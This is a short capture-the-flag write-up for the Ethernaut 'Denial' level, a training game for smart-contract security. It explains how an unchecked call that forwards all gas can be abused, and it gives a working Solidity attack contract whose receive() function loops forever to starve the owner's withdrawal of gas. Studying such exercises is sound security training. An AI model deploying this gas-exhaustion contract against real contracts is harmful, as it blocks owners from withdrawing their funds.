# Level 20: [Denial](https://ethernaut.openzeppelin.com/level/0xD0a78dB26AA59694f5Cb536B50ef2fa00155C488)

## Level objectives:
Deny the owner from withdrawing.
## Analysis
```solidity
partner.call{value:amountToSend}("");
payable(owner).transfer(amountToSend);
```
- The contract transfer to us before transferring to the owner.
- It also doesn't check the return value of `call`.
- Also, `call` forwards all available gas to the call, unless specified.
- So if we can get the call to "hang" when it sends us ether, we'll finish the gas, so it won't have any gas left to power the next tx.

## Code:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address) external;
}

contract AttackDenial {
    constructor() {
        Denial(0x06f30d2256f4a7D537Ea0e47823f687ea8a6bff3).setWithdrawPartner(address(this));
    }
    
    receive() external payable {
        while (true) {}
    }
}
```

